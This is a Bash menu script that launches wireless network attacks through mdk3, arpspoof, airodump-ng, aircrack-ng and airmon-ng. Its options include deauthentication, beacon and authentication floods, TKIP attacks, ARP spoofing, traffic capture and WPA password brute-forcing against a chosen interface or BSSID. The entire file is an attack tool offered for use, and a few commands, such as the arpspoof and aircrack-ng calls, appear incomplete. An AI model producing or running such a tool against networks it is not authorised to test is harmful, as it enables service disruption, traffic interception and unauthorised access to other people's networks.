cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

figlet "Wlan" |lolcat
figlet "Attacks" |lolcat
figlet "Menu" |lolcat

echo -e $green"========================"
echo -e $red"1)Deauth Attack"
echo -e $red"2)Beacon DDoS"
echo -e $red"3)Auth DDoS"
echo -e $red"4)TKIP"
echo -e $red"5)Spoof"
echo -e $red"6)Passive Attack"
echo -e $red"7)Brute Force WPA"
echo -e $red"8)Put Interface In Monitor Mode"
echo -e $red"9)Explore For Targets"
echo -e $green"========================"

read -p " [<Attacks>] " attacks 
if [ $attacks = "1" ] 
then 
clear
figlet "Deauth" |lolcat 
read -p " [>Interface<] " inter1
echo -e $green"[+] Starting..."
mdk3 $inter1 d 
fi 

if [ $attacks = "2" ] 
then
clear
figlet "Beacon DDoS" |lolcat 
read -p " [>Interface<] " inter2 
echo -e $green"[+] Starting..."
mdk3 $inter2 b 
fi

if [ $attacks = "3" ] 
then
clear
figlet "Auth DDoS" |lolcat
read -p " [>Interface<] " inter3 
echo -e $green"[+] Starting..."
mdk3 $inter3 a 
fi

if [ $attacks = "4" ]
then
clear
figlet "TKIP" |lolcat 
read -p " [>Interface<] " inter4 
echo -e $green"[+] Starting..."
mdk3 $inter4 m 
fi

if [ $attacks = "5" ] 
then
clear
figlet "Spoof" |lolcat 
read -p " [>Interface<] " inter5
echo -e $green"[+] Starting..."
arpspoof $inter5 
fi

if [ $attacks = "6" ]
then
clear
figlet "Passive" |lolcat
figlet "Attack" |lolcat
read -p " [>Interface<] " inter6
echo -e $green"[+] Starting..." 
airodump-ng -w data $inter6 
fi

if [ $attacks = "7" ]
then
clear
figlet "WPA" |lolcat
figlet "Brute" |lolcat 
read -p " [>Target-BSSID<] " bssid1 
read -p " [>Wordlist<] " word1
echo -e $green"[+] Starting..."
aircrack-ng -b $bssid1 -w $word1  
fi

if [ $attacks = "8" ] 
then
clear
figlet "Mon0" |lolcat 
read -p " [>Interface<] " inter8 
echo -e $green"[+] Starting..." 
airmon-ng start $inter8 
fi

if [ $attacks = "9" ] 
then
clear
figlet "Explore" |lolcat
read -p " [>Interface<] " inter9
echo -e $green"[+] Starting..."
airodump-ng $inter9 
fi
